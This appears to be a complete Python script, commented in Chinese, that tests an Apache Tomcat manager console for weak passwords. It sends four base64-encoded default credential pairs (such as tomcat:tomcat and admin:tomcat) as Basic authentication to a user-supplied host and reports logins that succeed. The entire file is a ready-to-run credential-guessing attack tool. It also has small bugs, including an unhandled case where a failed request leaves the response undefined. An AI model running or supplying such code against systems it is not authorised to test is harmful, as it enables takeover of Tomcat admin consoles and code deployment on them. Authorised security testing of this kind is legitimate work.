import requests
import re

# 攻击载荷模块
def payloads():
    pwds = [
        'dG9tY2F0OnRvbWNhdA==',
        'Ym90aDp0b21jYXQ=',
        'cm9sZTE6dG9tY2F0',
        'YWRtaW46dG9tY2F0'
    ]
    return pwds

# 发送载荷模块
def send_payload(url, pwd):
    headers = {
            # 'Host': f'{host}:8080',
            'Cache-Control': 'max-age=0',
            'Authorization': f'Basic {pwd}',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close',
        }
    try:
        response = requests.get(url=url, headers=headers)
    except Exception:
        pass
    return response

# 检验载荷模块
def chech_payload(response, pwd):
    if bool(re.search('Message',response.text)):
            print(f'[+] 存在Tomcat弱口令漏洞，url为：{url}（{pwd}）.')

def main(url):
    for pwd in payloads():
        response = send_payload(url, pwd)
        chech_payload(response, pwd)


url = str(input('[+] 请输入url，格式为http://ip:port ')) + '/manager/html'
main(url)
print('[+] Tomcat弱口令检测完毕')

    
